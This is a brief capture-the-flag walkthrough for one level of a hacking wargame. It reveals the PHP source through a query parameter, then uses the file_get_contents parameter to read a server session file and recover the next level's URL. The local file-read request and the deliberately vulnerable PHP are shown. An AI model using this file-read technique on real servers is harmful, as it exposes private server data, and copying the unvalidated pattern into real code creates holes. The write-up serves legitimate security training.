# Level-23

Level23-24 (https://matrix.voorivex.academy/let-us-go-to-save-him!)

send this request:

```text
https://matrix.voorivex.academy/let-us-go-to-save-him!/?show-me-the-codes
```

you will get a php code:

```php
<?php
session_start();
if (isset($_GET['show-me-the-codes'])) {
    show_source("index.php");
    exit();
}

require_once("next.php");
$_SESSION['code'] = $next;

if (security_check($_GET['code'])) {
    echo file_get_contents($_GET['code']);
    die();
}

?>
```

this code sets value of `$next` to our session and then wants to get the content of the file
where sessions are stored on the server which is `/var/lib/sessions/`
we hava also a session value in our storage in the browser so we access the file:

```text
https://matrix.voorivex.academy/let-us-go-to-save-him!/?code=/var/lib/php/sessions/sess_4400f342e9b653eb94bdbb1a94b4bf08
```

you will get this:

```text
code|s:49:"/the-final-fight-f570a4b62b398c60db1b49599024f3aa";
```

go to:

```text
https://matrix.voorivex.academy/the-final-fight-f570a4b62b398c60db1b49599024f3aa
```
